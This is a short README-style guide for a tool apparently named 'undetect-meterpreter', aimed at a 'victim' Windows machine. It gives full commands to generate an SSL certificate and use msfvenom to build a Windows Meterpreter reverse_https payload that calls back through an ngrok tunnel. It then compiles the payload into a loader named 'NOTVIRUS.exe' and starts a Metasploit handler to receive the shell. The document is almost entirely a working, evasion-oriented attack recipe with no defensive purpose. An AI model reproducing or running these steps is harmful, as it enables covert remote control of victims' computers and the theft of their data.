YOUR OS   - Linux (Debian) (recomendation: Kali Linux)
VICTIM OS - Windows (x64)
REQUIRMENTS:
     1. ngrok (2 accounts)
	curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok
     2. metasploit
	install in kali linux
     3. python3 (sudo apt install python3)
	sudo apt install python3
     4. x86_64-w64-mingw32-g++ 
	sudo apt-get install g++-mingw-w64-x86-64

1. Donwload repository 
git clone https://github.com/CsgoBotTG/undetect-meterpreter.git
2. Create 3 servers (tcp 9999, python -m http.server, http 8000)
3. Create ssl
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" \
    -keyout www.example.com.key \
    -out www.example.com.crt && \
cat www.example.com.key  www.example.com.crt > www.example.com.pem && \
rm -f www.example.com.key  www.example.com.crt
4. Create bincode
msfvenom -p windows/x64/meterpreter/reverse_https lhost=5.tcp.eu.ngrok.io lport=15754 HandlerSSLCert=/home/kali/meterpreter_undetect_without_compiler/www.example.com.pem StagerVerifySSLCert=true -f raw > bincode.bin
5. Configure src/main.cpp
6. Compile exe
x86_64-w64-mingw32-g++ -o NOTVIRUS.exe src/*.cpp -static -static-libgcc -static-libstdc++ -lwininet -mwindows
7. Start msfconsole
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 9999
set HandlerSSLCert /home/kali/meterpreter_undetected_without_compiler/www.example.com.pem
set StagerVerifySSLCert true
run
